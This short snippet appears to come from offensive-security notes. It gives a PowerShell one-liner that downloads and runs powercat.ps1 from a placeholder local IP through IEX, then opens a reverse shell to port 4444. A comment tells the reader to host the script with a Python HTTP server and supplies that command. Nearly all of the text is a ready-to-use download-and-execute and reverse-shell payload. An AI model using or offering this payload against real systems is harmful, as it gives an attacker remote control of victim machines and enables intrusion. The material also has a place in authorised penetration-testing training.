powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LOCALIP>:8000/powercat.ps1');
powercat -c <LOCALIP> -p 4444 -e powershell"

#Is worth to mention that this payload first perform a download and then use the binary to trigger a reverse shell. So you have to open a python web server with the following command in a directory in which is stored the powercat.ps1 script:

python3 -m http.server 8000
